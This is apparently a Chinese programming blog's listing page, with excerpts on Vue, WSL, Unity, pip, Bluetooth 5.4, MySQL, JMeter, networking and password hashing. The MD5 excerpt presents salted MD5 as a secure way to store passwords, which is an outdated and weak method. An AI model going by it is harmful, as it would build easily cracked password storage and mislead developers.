module.exports ={ chainWebpack(config) { config.module.rules.delete("svg"); // 重点：删除默认配置中处理svg, config.module.rule('svg-sprite-loader').test(/\.svg$/) .include.add(resolve('src/assets/svg')) // 处理svg目录 .end().use('svg-sprite-loader').loader('svg-sprite-loader') .options({//被加载svg 元素的名字变为svg-[name] symbolId: 'svg-[name]' }) } } 一定要注意在chainWebpack中配置的时候该配置是一直被执行的，并不是只有生产环境才执行，本人在设置的时候不小心将配置放在了 if (PROD) 条件中，导致本地调试的时候，一直无法正常加载，打印import的svg文件，打印的是加载到的是svg文件路径与文件名的hash组成，注意这个就是因为上述配置没有生效
import detail from '@/assets/svg/detail.svg';//加载单个svg 正常svg被正常加载，打印的是以下内容:
展示svg组件 &lt;template&gt; &lt;!-- v-bind="$attrs" 存在class之外的其它属性需要继承--&gt; &lt;svg class="svg-icon" aria-hidden="true"&gt; &lt;use :xlink:href="`#${svgname}`"/&gt; &lt;/svg&gt; &lt;/template&gt; &lt;script&gt; import { defineComponent } from 'vue'; export default defineComponent({ name: 'icon-svg', props: { svgname: { type: String, required: true, }, }, }) /* 自定义 svg 的显示 使用说明： 1、下载或制作的svg文件，放在/src/assets/svg目录下 2、项目根据/src/assets/svg/svgo.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86559f346144654fd440691e442e5abe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b1479a31e1f975df6a9a60353803a6a/" rel="bookmark">
			轻量级Linux系统Ubuntu20.04安装（win11下）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 本篇文章介绍的是Windows下轻量级的Linux系统安装，相比于用虚拟机（VM等）来安装Linux系统，这种方式更加的轻便和简单，占用内存的比例也比较少，与Windows的通信也比较方便。但是基于有利必有弊的原则，Ubuntu还是有一定的不足的，如该虚拟机是没有界面的，就像DOS一样，都是基于命令来进行操作的，但是对于一些大佬的计算机配置不足，用这种Linux虚拟机是非常好的。
Ubuntu内存占用：
Windows下安装Ubuntu（Linux虚拟机） 在Windows下可以直接安装Linux虚拟机，与虚拟机（VMware等）中安装Linux系统不同，这种方式更加轻便，而且响应速度也非常快，占用的内存空间也比较小，更加方便Windows和Linux的互通。
安装流程 环境配置 · 开启Windows开发人员模式
打开设置→点击隐私和安全性→点击开发者选项→打开开发人员模式
· 启用Windows子系统功能
打开控制面板→点击程序→点击程序和功能下的启用或关闭Windows功能→在里面找到适用于Linux的Windows子系统
点击确定后，等待提示重启Windows就可以了
上面的完成，Windows下的Linux环境就配置好了，接下来就是下载Ubuntu
安装Linux虚拟机 找到Windows应用商店，搜索Ubuntu点击获取安装（Ubuntu20.04）
这里我们选择20版本，不建议选择最新的，最新版一些库可能支持的还不是那么好，另外可能有一些潜在的缺陷
20版已经运行了2，3年相对来说比较稳定
LTS = Long Time Support 长时间支持版本的意思
下载完成后，点击软件图标就可以进入Linux虚拟机系统
正在安装，如果上面的环境没有配置，这里会报错显示安装失败
安装完成后，第一次需要创建用户和设置用户密码
出现你设置的用户，就证明成功了
设置root密码 第一次安装后，root用户的密码是随机的，所以我们来设置一下root用户密码
指令：sudo passwd
输入当前用户密码
成功后就可以用你设置的root密码进入root账户了
使用bash进入Linux系统 在Windows下可以直接通过bash.exe进入Linux子系统
打开cdm输入"C:\Windows\System32\bash.exe"
到这里Windows下Linux虚拟机就安装完成了，剩下的一些Linux下的配置请参考https://blog.csdn.net/weixin_64647426/article/details/129319160或其它博客
感谢观看学习，大佬们多多指点，愿明天的自己会感谢当下的努力！！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/965b44e63fe4265c1e1af3a990e50cf5/" rel="bookmark">
			【Unity】获取UI物体在屏幕上的位置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 获取UI物体在屏幕上的位置 获取ui在自身Canvas的相对位置且canvas全屏
ui的屏幕坐标就是自身相对于canvas位置加上canvas大小的1/2；
Canvas canvas = this.transform.GetComponentInParent&lt;Canvas&gt;(); RectTransform canvasRect = canvas.transform.GetComponent&lt;RectTransform&gt;(); //自身相对于Canvas的位置 Vector3 loadpos = canvas.transform.InverseTransformPoint(this.transform.position); //屏幕位置 Vector3 screenPoint = loadpos + new Vector3(canvasRect.sizeDelta.x, canvasRect.sizeDelta.y, 0) / 2; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcb0628946384e156316d13bde744db4/" rel="bookmark">
			每日一题40——链表求和
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定两个用链表表示的整数，每个节点包含一个数位。
这些数位是反向存放的，也就是个位排在链表首部。
编写函数对这两个整数求和，并用链表形式返回结果。
示例：
输入：(7 -&gt; 1 -&gt; 6) + (5 -&gt; 9 -&gt; 2)，即617 + 295
输出：2 -&gt; 1 -&gt; 9，即912
解题思路：
新建三个数组，将链表1的节点值存入数组1中，链表2的节点值存入数组2中，数组1和数组2中的元素求和倒序放入数组3中，将数组3中的元素赋给链表，返回链表即可
代码：
/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */ class Solution { public: ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) { int sum = 0, sum1 = 0,sum2 = 0; vector&lt;int&gt; ans1; vector&lt;int&gt; ans2; vector&lt;int&gt; ans; ListNode* p1,*p2,*p,*s; s = new ListNode(); p1 = l1; p2 = l2; while(p1){ ans1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fcb0628946384e156316d13bde744db4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7bb9b665adaca57e0ac0244ad1e12665/" rel="bookmark">
			73. python第三方库安装教程（超详细）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		73. python第三方库安装教程（超详细） 文章目录 73. python第三方库安装教程（超详细）1.知识回顾2. openpyxl 库的作用3. 第三方库的安装步骤【警告内容释义】 4. 更新pip5. pip 常用命令1. 什么是pip2. pip --version 查看 pip 版本和所在的路径3. pip list 显示已安装的包4. 卸载包/库5. 查找包安装的路径 6. 用镜像源安装第三方库7. 用管理员权限打开命令提示符8. 总结1. 第三方库的安装步骤2. 代码总结3. pip国内常用的一些镜像源 1.知识回顾 Python 的库分为2类。
标准库：不需要安装，需要导入。
第三库：需要安装、需要导入。
【导入语法】
import + 库名
【示例】
import os 2. openpyxl 库的作用 openpyxl = open + python + xlsx
【简写如下】
openpyxl = open +py + xl
open 是打开的意思。
py 指 python 。
xl 是 xlsx/xlsm/xltx/xltm 的缩写。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7bb9b665adaca57e0ac0244ad1e12665/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b97f8cb9acda68c83985efa9b3b45f1c/" rel="bookmark">
			蓝牙技术|蓝牙5.4标准正式发布，蓝牙ESL电子价签迎来一波利好
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		蓝牙技术联盟于2023年1月31日批准了蓝牙核心规范v5.4版本(以下简称蓝牙5.4版本)，并已正式公布。
蓝牙5.4版本引入了四个新特性，如下:
广播数据加密（Encrypted Advertising Data）：对广播数据进行加密以提高广播数据传输的机密性和安全性。
广播编码选择（Advertising Coding selection）：对扩展广播中采用的LECoded PHY指定编码方式（S=2或S=8）以管控和协调包含Mesh节点在内的蓝牙设备间的通信距离。 带响应的周期性广播（Periodic Advertising with Responses）：用于向给定区域的所有同步接收设备传输周期性广播控制消息及用户数据，并允许同步接收设备通过响应时隙向广播设备发送响应。
LE GATT安全级别特征（LEGATT Security Levels Characteristic）：用于在初始建立低功耗蓝牙连接时即通过此GAP服务特征让GATT客户端设备了解GATT服务端设备对安全级别的更高要求，从而提前执行必要的鉴权和加密过程，确保后续的所有数据访问操作均不会由于安全性不足而出现错误提示。 蓝牙5.4版本的新增特性进一步增强了蓝牙无线通信技术的安全性，有助于提升蓝牙Mesh网络及基于GATT的各类蓝牙应用的用户体验，并将在新特性的基础上开发全新蓝牙应用规范。
新版本同时为电子价签带来了全新标准。据了解，相关技术的更新，一方面可使单个网络中价签连接量扩充至32640个，另一方面可实现网关与价签的双向通信。
电子价签，也叫电子货架标签（Electronic Shelf Label，ESL），是一种带有信息收发功能的电子显示装置，主要应用于超市、便利店、药房等显示价格信息的电子类标签。
蓝牙5.4更新了两个与电子价签相关的功能：
Periodic Advertising with Responses（PAwR，有响应的周期性广播） PAwR将允许实现具有双向通信的星状网络，该功能增加了ESL设备接收数据并响应至发送器的能力。此外，ESL设备能够被分为多个群组，并且每个ESL设备会拥有特定地址，便于最大化连接量，以及完成一对一及一对多的通信。
一对一通信
一对多通信
图中，AP是PAwR广播器；ESL是电子价签（属于不同Grp，拥有独立ID）；subevent是子事件；rsp slot是响应槽。如图，黑色的水平线是AP发送命令和数据包给ESL，红色的水平线是ESL响应并反馈到AP。
根据《Bluetooth Core Specification Version 5.4》，ESL使用由8位ESL ID和7位组ID组成的设备寻址方案（二进制）。并且ESL ID在不同群组中具有唯一性。因此，ESL设备网络最多可包含128个组，每个组最多包含255个属于该组成员的独特ESL设备。简单来说，一个网络中总共可能有32,640个ESL设备，每个标签都可以从单个接入点进行控制。
Encrypted Advertising Data（EAD，加密广播数据） EAD主要提供广播数据加密的功能。在广播数据被加密后，可以被任何设备接收，但只能由先前共享通信密钥的设备解密和验证。该特性的显著好处是，广播数据包的内容在设备地址更改时，会随之更改，从而降低被跟踪的可能性。
加密广播
基于以上两个功能的更新，蓝牙将在电子价签应用中更具优势。尤其对比433MHz和私有2.4GHz，二者没有国际范围适用的通讯标准，实用性、稳定性、安全性不能有较好保证，尤其在安全性方面，二者被破译的可能性将更大。
伦茨科技拥有自主研发无线射频和低功耗蓝牙BLE5.2芯片并具有全球知识产权，针对AIoT物联网领域和个人消费者，提供蓝牙主控全集成芯片的「软硬件共性」解决方案及核心器件，配套全方位APP软件平台定制开发。所设计的蓝牙芯片方案应用于智能穿戴设备、蓝牙室内导航、智能家居、医疗健康、运动建身、数据传输、远程控制、个人外设及AIoT物联网等场景。（tingting是伦茨科技旗下品牌，主要是提供Apple Find My服务应用于各大物联网产品中）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f737b899c897e51a9ecc171b7ecb8ee/" rel="bookmark">
			蓝桥杯c组--合数个数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[问题描述]
一个数如果除了 1 和自己还有其他约数，则称为一个合数。例如: 1,2,3不是合数，4.6 是合数
请问从 1 到 2020 一共有多少个合数。
public class Demo { public static void main(String[] args) { int num = 2020; int count = 0; for(int i = 1; i &lt;= num;i++) { for(int j = 1;j &lt;= i;j++) { int temp = 0; //i的约数 if(i % j == 0) { temp = j; //约数判断 if (temp != 1 &amp;&amp; temp != i) { count++; break; } } } } System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f737b899c897e51a9ecc171b7ecb8ee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b289a4148cf95b626ea27bcaaddb8f5/" rel="bookmark">
			2020蓝桥杯真题合数个数（填空题） C语言/C&#43;&#43;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目描述
本题为填空题，只需要算出结果后，在代码中使用输出语句将所填结果输出即可。
一个数如果除了 1 和自己还有其他约数，则称为一个合数。例如：1,2,3 不是合数，4,6 是合数。
请问从 1 到 2020 一共有多少个合数。
运行限制
最大运行时间：1s
最大运行内存: 128M
所需变量
int n;//终止条件
int sum = 0;//计算有多少个合数，初始化为0
思路：首先我们要编写判断合数的函数方法，如果是合数，那我们就返回1，如果不是合数我们就返回零，就是找这个数从2到这个数的一半，如果有数能被除尽，那么说明有约数，就代表是合数！
代码如下：
int solution(int a){ for(int i = 2;i&lt;=(a/2);i++){ if(a%i == 0){ return 1; } } return 0; } 然后就是从3开始不断判断，只要是合数，我们就sum++，最后将得到的sum输出出来就完成
该算法本人认为比较优，如果有更好的想法，欢迎q我！
完整代码如下（编译器是dev，语言是C语言）：
#include &lt;iostream&gt; using namespace std; int solution(int a){ for(int i = 2;i&lt;=(a/2);i++){ if(a%i == 0){ return 1; } } return 0; } int main() { int n = 2020; int sum = 0; for(int i = 3;i&lt;=2020;i++){ if(solution(i)){ sum++; } } cout&lt;&lt;sum&lt;&lt;endl; return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a403517bfac3d204efe84a8abb7c0f6c/" rel="bookmark">
			vFlash 软件升级方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vFlash 软件升级方案
代码源文件结构清晰，代码采用分层思想。把uds服务接口统一，按照服务名分解成源文件。通过uds.c进行统一的管理，如权限，会话模式管理。
对于需要的服务采用回数方式，给用户提供接口。如服务11需要用户提供系统复位，预留用户ResetCallBack
代码源文件结构清晰，代码采用分层思想。把uds服务接口统一，按照服务名分解成源文件。通过uds.c进ggvvv行统一的管理，如权限，会话模式管理。
对于需要用户参与fffjjj的服务采用回调函数方式，给用户提供接口。如服务11需要用户提供系统复位，预留用户ResetCallBackFun回调接口。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/116a6bafdbe91def8333bf089ea2e89b/" rel="bookmark">
			Vector VFlash 国产化 uds BootLoader 升级方案 UDS诊断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62deb588fed0361165c885641d02eeb9/" rel="bookmark">
			VScode安装vue&#43;nodejs &#43;管理nodejs版主工具包nvm
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、使用之前，我们先来掌握3个东西是用来干什么的。 npm: Nodejs下的包管理器。 webpack: 它主要的用途是通过CommonJS的语法把所有浏览器端需要发布的静态资源做相应的准备，比如资源的合并和打包。 vue-cli: 用户生成Vue工程模板。（帮你快速开始一个vue的项目，也就是给你一套vue的结构，包含基础的依赖库，只需要 npm install就可以安装） 开始： https://nodejs.org
如图，下载8.9.3 LTS （推荐给绝大部分用户使用） 双击安装 可以使用默认路径，本例子中自行修改为d:\nodejs 一路点Next 点Finish完成 打开CMD，检查是否正常 找不到AppData：查看隐藏项目就可以在目录下看到了
再看看另外2个目录，npm的本地仓库跑在系统盘c盘的用户目录了(没见到npm-cache是因为没有用过，一使用缓存目录就生成了)，我们试图把这2个目录移动回到D:\nodejs 先如下图建立2个目录 然后运行以下2条命令 npm config set prefix "D:\nodejs\node_global" npm config set cache "D:\nodejs\node_cache" 如上图，我们再来关注一下npm的本地仓库，输入命令npm list -global 输入命令npm config set registry=http://registry.npm.taobao.org 配置镜像站 输入命令npm config list 显示所有配置信息，我们关注一个配置文件 C:\Users\Administrator\.npmrc 使用文本编辑器编辑它，可以看到刚才的配置信息 检查一下镜像站行不行命令1 npm config get registry 检查一下镜像站行不行命令2 Npm info vue 看看能否获得vue的信息 注意，此时，默认的模块D:\nodejs\node_modules 目录 将会改变为D:\nodejs\node_global\node_modules 目录， 如果直接运行npm install等命令会报错的。 我们需要做1件事情： 1、增加环境变量NODE_PATH 内容是：D:\nodejs\node_global\node_modules （注意，一下操作需要重新打开CMD让上面的环境变量生效） 一、测试NPM安装vue.js 命令：npm install vue -g （注意，此命令需要使用 管理员模式 打开的 命令提示符）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62deb588fed0361165c885641d02eeb9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00a114287a59569f2bd47e5f7ef06c23/" rel="bookmark">
			项目中的MD5、盐值加密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先介绍一下MD5，而项目中用的是MD5和盐值来确保密码的安全性； 1. md5简介
md5的全称是md5信息摘要算法（英文：MD5 Message-Digest Algorithm ），一种被广泛使用的密码散列函数，可以产生一个128位（16字节，1字节8位）的散列值（常见的是用32位的16进制表示，比如：0caa3b23b8da53f9e4e041d95dc8fa2c），用于确保信息传输的完整一致。
2. md5原理
md5将整个文件当做一个大文本信息，通过不可逆的字符串变换算法，产生一个唯一的MD5信息摘要。文件的md5类似于人的指纹，在世界上是独立无二的，如果任何人对文件做了任何改动，其md5的值也就是对应的“数字指纹”都会发生变化。
对MD5算法简要的叙述可以为：MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。
md5与对称和非对称加密算法不同，这两种密码是防止信息被窃取，而摘要算法的目标是用于证明原文的完整性。
3. md5特性
1. 不可逆
没有系统有办法知道md5原来的文字是什么。
2. 具有高度的离散性
md5码具有高度的散列性，没有规律可循，哪怕原信息只有一点点的变化，比如多个空格，那么就会导致md5发生巨大变化，也可以说产生的md5码是不可预测的。
3. 压缩性
任意长度的数据，算出的md5值得长度都是固定的。
4. 弱碰撞性
已知原数据和其md5的值，想找到一个具有相同md5值得数据（即伪造数据）是非常困难的。
4. md5的用途
密码的加密存储，用户设置密码时，服务端只记录这个密码的MD5，而不记录密码本身，以后验证用户身份时，只需要将用户输入的密码再次做一下MD5后，与记录的MD5作一个比较即可验证其密码的合法性。
数字签名，比如发布一个程序，为了防止别人在你的程序里插入病毒或木马，你可以在发布这个程序的同时，公开这个程序文件的MD5码，这样别人只需要在任何地方下载这个程序后做一次MD5，然后跟公开的这个MD5作一个比较就知道这个程序是否被第三方修改过。
文件完整性验证，比如当下载一个文件时，服务器返回的信息中包括这个文件的md5，在本地下载完毕时进行md5，将两个md5值进行比较，如果一致则说明文件完整没有丢包现象。
文件上传，比如百度云实现的秒传，就是对比你上传的文件md5在百度服务器是否已经存在了。
MD5不安全的3个原因 1、字典表很大
在网上有很多md5解密网站（如：https://md5.cn/），就如同一个字典表。通过在数据库存储很多常用的密码，可以在很短的时间内查找任何哈希值的答案。这种数据库占用大量的磁盘空间，具有一定的成功率。在计算机安全领域，一些朋友需要用到MD5解密网站，通过这类型的网站，可以提高工作效率，大家可以去试试。
2、碰撞
安全的算法具有良好的抗冲突性，也就是说对于不同的单词，获得相同哈希值的可能性比较低，但是MD5的抗冲突性较低。
3、暴力攻击速度很快
蛮力攻击是通过尝试多种可能性来查找密码的一种方法，即可以猜测用户可能使用的东西（出生日期，孩子的名字，宠物的名字等），也可以尝试一切（从a，b， c到10个字符的特殊字符密码）。抵御暴力攻击的唯一方法可能是密码长度，如果您拥有40个字符长的随机密码（带有特殊字符），那么目前你的密码可能是安全的。
所以这里采用MD5+盐值的方法来加强密码的安全性： 首先在项目中加入hutool的依赖，我们就可以使用这个类了
&lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;5.8.5&lt;/version&gt; &lt;/dependency&gt; 然后创建一个util工具包来存放我们的密码工具类 PasswordUtil，
接下来，我们就可以直接使用hutool里面的IdUtil生成随机盐值，然后盐值+密码再进行MD5进行进一步的加密（因为常用$符进行分隔，这里也用$进行分割）
public static String encrypt(String password) { // 随机盐值 String salt = IdUtil.simpleUUID(); // 密码（md5(随机盐值+密码)） String finalPassword = SecureUtil.md5(salt + password); return salt + "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00a114287a59569f2bd47e5f7ef06c23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3acdfb41a5badd4f07dc3f789a2a728/" rel="bookmark">
			ValueError:too many values to unpack (expected 2)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 【学习参考】：成功解决ValueError:too many values to unpack (expected 2)_叫我李嘉图的博客-CSDN博客 ValueError: too many values to unpack (expected 3)_归来-依旧-是-少年的博客-CSDN博客 解决思路: (1).首先理解错误类型:
ValueError–ValueError：函数或方法虽然接受了正确的【类型】的参数，但是该参数的【值】不适当，比如int(‘nick’)，int函数可以接受字符串类型，但是’nick’字符串不具备表示一个整数的含义。
(2).错误处:
存在两个(相同)的被打开/使用。
(3).错误解决:
针对出错的行，查看出错行的附近是否有无重复的函数操作，考虑到情况，将其中一个修改为正确的即可。
报错代码：
for j (train_index,test_index) in kf.split(x,y,groups) 解决问题：
出现函数、参数不符合的问题，检查之后发现格式问题： for j ,(train_index,test_index) in enumerate(kf.split(x,y,groups)): 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9728ed2c6746604cb7e3af9276feb788/" rel="bookmark">
			MySQL存储过程（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是存储过程 存储过程(Stored Procedure)，简单地说，存储过程就是数据库中保存(Stored)的一系列SQL命令(Procedure)的集合。也可以将其看作相互之间有关系的 SQL命令组织在一起形成的一个小程序。它存储在数据库中，一次编译后永久有效，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它
优点 (1)高执行性能 通常在客户端执行 SQL 命令时，在数据库中有解析到编译的这个前期准备过程。但是，存储过程是事先完成了解析、编译的处理后保存在数据库中的，执行时能减轻数据库负担，提高执行性能。
(2)可减轻网络负担 使用存储过程后，复杂的数据库操作也可以在数据库服务器中完成。只需要从客户端(或应用程序)传递给数据库必要的参数就行，比起需要多次传递 SOL 命令本身，这大大减轻了网络负担。特别是在应用程序与数据库服务器之间通过网络通信的场合，能够减少相互之间的通信量，大幅度提高整体的性能。
(3)可防止对表的直接访问 可以禁止对表本身的访问，只赋予用户对相关存储过程的访问权限。限制客户端只能通过存储过程才能访问表，可以事前防止对表的一些预想不到的操作。
(4)可将数据库的处理黑匣子化 构建应用程序时，在应用程序中编写对数据库进行的复杂处理，是减低程序可读性的重要原因。
但是，如果将这些处理以存储过程的形式编写，并保存在数据库中，应用程序的处理将会简洁许多。应用程序中完全不用考虑存储过程的内部详细处理，只需要知道调用哪个存储过程就可以了。
二、mysql8.0版的存储过程保存在哪个表？ 想查看存储过程的话：show procedure status; (显示数据库中所有存储的存储过程基本信息，包括所属数据库，存储过程名称，创建时间等)
想看存储过程代码：show create procedure procedure_name;(显示某一个存储过程的详细信息)
存储过程存放在infomation_schema.ROUTINES表内。
通过关键字符模糊匹配使用到的存储过程： SELECT a.ROUTINE_SCHEMA,a.ROUTINE_TYPE,a.ROUTINE_NAME FROM information_schema.ROUTINES a where a.ROUTINE_DEFINITION like '%关键字%'; 三、定义存储过程 创建存储过程使用 CREATE PROCEDURE 命令，具体的语法如下
CREATE PROCEDURE 存储过程名( 参数的种类1 参数1 数据类型 1 [,参数的种类2 参数2 数据类型 2···] ) BEGIN 处理内容 EnD 即将“处理内容”定义为名为[存储过程名]的存储过程。通常在存储过程名前加上[sp_]样的开头，以区别数据库中的其他对象。处理内容必须在 BEGIN 与END 之间编写。
在调用存储过程时可以指定参数。参数是存储过程与调用方进行信息交换的中介。
存储过程的参数可以分为输入参数《接受调用方的数据)，输出参数(向调用方返回处理结果)。定义时在具体参数前指定IN OUT INOUT 的其中之一(输入参数时可省略N)由关键字IN、OUT、INOUT决定参数到底是输入参数还是输出参数。INOUT 的参数既是输入型参数，也是输出型参数。
3.1 通过DELIMITER命令改变分隔符 DELIMITER 是改变 MySQL 监视器中使用的 SQL 语分离符的命令。默认的分隔符是[;]。但是，存储过程本身就是命令的集合，其中一定会含有引 [;]。如果保持原来的默认分隔符，那么究竟是CREATE PROCEDURE 命令的结束符，还是存储过程内部 SQL语的结符，MySQL 监视器是无法分清的。(使用Navicat等链接可以不执行此步骤)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9728ed2c6746604cb7e3af9276feb788/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4e0ad873127b8b265ec4d5f70c4cc21/" rel="bookmark">
			jmeter TCP接口压力测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		启动jmeter,添加线程组、TCP取样器、察看结果树 1.添加线程组
2.添加TCP取样器
3.添加监听器察看结果树
配置TCP取样器参数信息 1.TCPClient classname：报文格式，分3种：
org.apache.jmeter.protocol.tcp.sampler.TCPClientImpl：普通文本传输
org.apache.jmeter.protocol.tcp.sampler.BinaryTCPClientImpl：十六进制报文
org.apache.jmeter.protocol.tcp.sampler.LengthPrefixedBinaryTCPClientImpl：继承BinaryTCPClientImpl，会自动在前缀增加内容长度，默认两个字节，可以通过属性tcp.binarylength.prefix.length（在配置文件jmeter.properties中）进行设置
修改jmeter.properties文件
2.Target Server：服务器地址信息
注：如果不配置超时响应时间，一定时间后才会返回执行结果；如果配置了，会在超时之后，返回执行结果。
Re-use connection（常用）：选中后，链接保持长连接，否则，在读取数据后将其关闭
关闭连接：选中后，运行取样器之后关闭连接
行尾（EOL）字节值（常用）：响应数据的最后2位，转换为10进制的值，取值区间[-128,127]。用于判断并告知TCP取样器这次请求已经响应成功，运行其他线程，否则服务器上会产生多个链接一直不被释放
EOL计算方式参考博文https://blog.csdn.net/qq_41493224/article/details/118908310
要发送的文本：填写要发送的内容
注：十六进制数之间不能有空格，不能有换行（报错：Response message: java.lang.IllegalArgumentException: Hex-encoded binary string contains an uneven no. of digits）
调试脚本 点击运行，查看响应数据
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/061ee1f63ff7fe96d85f39d0ae4af5b1/" rel="bookmark">
			交换机电口、光口、网络速率的基本概念总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		电口和光口千兆网 &amp; 万兆网：POE：包转发率：背板带宽/交换容量：光纤跳线 ) 电口和光口 电口：
电口也即RJ45口，插双绞线的端口（网线），一般速率为10M或100M，即为百兆工业交换机，部分支持1000M，即为千兆交换机。
光口：
工业以太网交换机的光口是光纤接口的简称，有单模、多模、千兆、百兆等规格。
工业交换机上的光口一般是成对在一起的，一个TX发送端,一个RX接收端，百兆交换机端口型式一般是SC卡装方口，千兆交换机光口一般是SFP光模块，端口型式为LC。
电口和光口的相同点：都是起传输作用。
不同点：
传输距离不同：电口最远距离为100米。而光口根据光纤类型不同，可达5KM到100KM。
连接方式不同：电口是连接网线和同轴传输电缆的，光口是连接光缆的。
千兆网 &amp; 万兆网： 千兆光纤网络和万兆光纤网络主要是传输速率不同。千兆网络的传输速率是1000Mbps（千兆），而万兆网卡的传输速率是10Gbps（万兆），它是千兆光纤网卡传输速率的十倍。
POE： 以太网供电（Power over Ethernet，简称PoE）也称为PoE供电，是一种可以在以太网路中透过双绞线来传输电力与资料到装置上的技术。以太网供电技术的出发点是让IP电话、WLAN接入点、网络摄像头等小型网络设备，可以直接从以太网线（4对双绞线中空闲的2对来传输）获得电力，无需单独铺设电力线，以简化系统布线，降低网络基础设施的建设成本。
包转发率： 包转发速率通常分为第二层包转发率（L2）和第三层包转发（L3），是指交换机每秒可以转发多少百万个数据包（Mpps），即交换机能同时转发的数据包的数量。包转发率以数据包为单位体现交换机的交换能力，包转发率的数值表示交换机转发数据包能力的大小，一般交换机的包转发率在几十kpps到几百Mpps不等。
决定包转发率的一个重要指标就是交换机的背板带宽，背板带宽是交换机总的数据交换能力。一台交换机的背板带宽越髙，其处理数据的能力就越强，包转发率越髙。
背板带宽/交换容量： 交换机的背板带宽，是交换机接口处理器或接口卡和数据总线间所能吞吐的最大数据量。背板带宽标志了交换机总的数据交换能力，单位为Gbps，也叫交换带宽，一般的交换机的背板带宽从几Gbps到上百Gbps不等。一台交换机的背板带宽越高，所能处理数据的能力就越强，但同时设计成本也会越高。
一般所说的交换机背板带宽与吞吐量是衡量交换机数据转发能力的重要标准，与下边两个概念有关系
一、交换机交换容量（Gbps）
1、bps——bit/s
2、一般是指交换机处理器及数据总线间所能吞吐的最大数据量
3、计算
交换容量 = 交换机端口数量×端口速率×2（全双工模式）
例如：一台24口的千兆交换机，其交换容量 = 24×1000Mbps×2 = 48Gbps
4、为满足交换机线速转发标准，交换容量应当&lt;=公布的交换机 背板带宽
二、包转发率（pps）
1、pps——packets/s
2、一般见于三层交换机的性能指标中；衡量交换机转发以包为单位的数据的能力
3、计算
全双工千兆网络下，
包转发率 = 端口数量×1.488Mpps
注：1.488Mpps的计算由来：以太网数据包中，最小的包为64byte，加上8byte前导字符，以及12byte的帧间隙，共84byte；千兆网速率1000Mbit/s,所以得到一个千兆端口的包转发率= 1000/(84×8) = 1.488Mpps
4、为满足交换机线速转发标准，交换机“端口数量×包转发率×2(全双工)”应当&lt;=公布的交换机 最大吞吐量
光纤跳线 光纤跳线，是用来做从设备到光纤布线链路的跳接线。有较厚的保护层，一般用在光端机和终端盒之间的连接，应用在光纤通信系统、光纤接入网、光纤数据传输以及局域网等一些领域。
